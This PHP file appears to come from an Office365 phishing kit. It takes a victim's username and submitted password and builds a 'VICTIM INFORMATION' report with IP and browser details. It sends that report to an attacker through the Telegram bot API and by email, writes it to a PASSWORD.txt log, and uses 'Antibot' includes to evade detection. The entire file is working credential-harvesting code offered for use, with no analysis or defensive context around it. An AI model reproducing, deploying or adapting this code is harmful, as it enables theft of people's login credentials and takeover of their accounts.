<?php
session_start();
error_reporting(0);
// error_reporting(E_ALL);
// ini_set('display_errors', 1);

$TIME_DATE = date('H:i:s d/m/Y');

include('../Antibot/blockers.php');
include('../Antibot/detects.php');

include('../Antibot/Bot-Crawler.php');
include('../Antibot/Dila_DZ.php');

include ('../config.php');

include('../functions/get_browser.php');
include('../functions/get_ip.php');


$_SESSION['password'] = $_POST['passwd'];
$Z118_MESSAGE = "";
$Z118_MESSAGE .= "
	
	[ OFFICE365 ACCOUNT LOGIN]
	[ LOGIN INFORMATION]
	
	[Username] = ".$_SESSION['username']."
	[Password] = ".$_POST['passwd']."

	±±±±±±±±±±±±±±±±[ VICTIM INFORMATION ]±±±±±±±±±±±±±±±±±±±

	[TIME/DATE]    = ".$TIME_DATE."
	[IP INFO] = http://ip-api.com/json/".$_SESSION['_ip_']."
	[REMOTE IP]    = ".$_SERVER['REMOTE_ADDR']."
	[BROWSER] = ".Z118_Browser($_SERVER['HTTP_USER_AGENT'])." On ".Z118_OS($_SERVER['HTTP_USER_AGENT'])."
	[BROWSER] = ".$_SERVER['HTTP_USER_AGENT']."

	##################[ BY @X_hammer ]##################### 
	\n";



	if ($send_results_to_telegram === "on") {
		$data = [
		'text' => ''.$Z118_MESSAGE.'',
		'chat_id' => ''.$chat_id.''
		];
		file_get_contents("https://api.telegram.org/bot".$bot_token."/sendMessage?" . http_build_query($data) );
	}

	if ($send_results_to_email === "on") {
		$Z118_HEADERS = "";
		$Z118_SUBJECT = "✪ LOGIN FROM : ✪ ".$_SESSION['username']." ✪";
		$Z118_HEADERS .= "From:XD <X-hammer@logs.com>";
		$Z118_HEADERS .= $_SESSION['username']."\n";
		$Z118_HEADERS .= "MIME-Version: 1.0\n";
		$Z118_HEADERS .= "Content-type: text/html; charset=UTF-8\n";
	
	
		@mail($Z118_EMAIL, $Z118_SUBJECT, $Z118_MESSAGE, $Z118_HEADERS);
	}

	if($save_results_to_cpanel === "on") {
		$res_file = fopen("../logs/PASSWORD.txt", "a");
		fwrite($res_file, $Z118_MESSAGE);
	}

	
	
	if($redirect_to_next_page == "on") {
		Header("Location: ../../session_relogin.php");
	}
	
?>
